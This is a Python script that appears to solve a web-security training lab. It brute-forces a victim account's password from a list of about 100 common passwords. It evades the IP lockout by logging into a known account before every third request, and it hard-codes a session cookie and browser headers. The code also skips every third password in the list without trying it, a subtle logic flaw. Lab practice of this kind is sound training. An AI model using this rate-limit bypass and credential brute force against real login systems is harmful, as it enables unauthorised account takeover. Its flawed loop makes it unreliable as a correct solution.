'''
I found out that when login successfully, the rate limit is reset.
When send 3 failed login requests, the IP is locked for 1 minute. This time, perhaps
it uses REMOTE_ADDR (which gets the IP address from TCP connection), so we cannot fake.
--> Send 2 brute force requests, then login to the default account, and repeat.
'''

import requests

burp0_url = "https://0a0900ac0359d24b80b0491a008b008d.web-security-academy.net:443/login"
burp0_cookies = {"session": "n6nN5QAYfVbdr3WhHkYzulN4inLdEKw9"}
burp0_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Accept-Language": "en-US,en;q=0.9", "Origin": "https://0a0900ac0359d24b80b0491a008b008d.web-security-academy.net", "Content-Type": "application/x-www-form-urlencoded", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://0a0900ac0359d24b80b0491a008b008d.web-security-academy.net/login", "Accept-Encoding": "gzip, deflate, br", "Priority": "u=0, i"}

passwd_list = [
    "123456",
    "password",
    "12345678",
    "qwerty",
    "123456789",
    "12345",
    "1234",
    "111111",
    "1234567",
    "dragon",
    "123123",
    "baseball",
    "abc123",
    "football",
    "monkey",
    "letmein",
    "shadow",
    "master",
    "666666",
    "qwertyuiop",
    "123321",
    "mustang",
    "1234567890",
    "michael",
    "654321",
    "superman",
    "1qaz2wsx",
    "7777777",
    "121212",
    "000000",
    "qazwsx",
    "123qwe",
    "killer",
    "trustno1",
    "jordan",
    "jennifer",
    "zxcvbnm",
    "asdfgh",
    "hunter",
    "buster",
    "soccer",
    "harley",
    "batman",
    "andrew",
    "tigger",
    "sunshine",
    "iloveyou",
    "2000",
    "charlie",
    "robert",
    "thomas",
    "hockey",
    "ranger",
    "daniel",
    "starwars",
    "klaster",
    "112233",
    "george",
    "computer",
    "michelle",
    "jessica",
    "pepper",
    "1111",
    "zxcvbn",
    "555555",
    "11111111",
    "131313",
    "freedom",
    "777777",
    "pass",
    "maggie",
    "159753",
    "aaaaaa",
    "ginger",
    "princess",
    "joshua",
    "cheese",
    "amanda",
    "summer",
    "love",
    "ashley",
    "nicole",
    "chelsea",
    "biteme",
    "matthew",
    "access",
    "yankees",
    "987654321",
    "dallas",
    "austin",
    "thunder",
    "taylor",
    "matrix",
    "mobilemail",
    "mom",
    "monitor",
    "monitoring",
    "montana",
    "moon",
    "moscow"
]

default_account = {"username": "wiener", "password": "peter"}
victim_account = {"username": "carlos", "password": "unknown"}

def send_req(payload):
    resp = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=payload)
    return resp.text
    
cnt = 0
for passwd in passwd_list:
    cnt += 1
    if cnt % 3 == 0: # login default account to reset rate limit
        print("Rate limit reset...")
        send_req(default_account)
    else:
        print(f"Trying password: {passwd}")
        victim_account["password"] = passwd
        if "Your username is" in send_req(victim_account):
            print(f"Password found: {passwd}")
            break